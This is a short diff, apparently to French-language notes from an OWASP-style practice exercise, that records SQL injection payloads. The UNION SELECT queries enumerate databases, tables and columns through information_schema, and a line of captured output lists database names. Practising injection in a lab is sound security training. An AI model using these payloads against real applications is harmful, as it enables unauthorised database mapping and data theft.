@@ -3,7 +3,7 @@
 = Ville : 1 - Superhéros : |mysql|,|information_schema|,|performance_schema|,|sys|,|owasp|
 
 
-' UNION SELECT 1,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name='owasp' -- -
+' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = 'owasp' -- -
 = exercices
 
 ' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = 'owasp' LIMIT 1 OFFSET 2 -- -
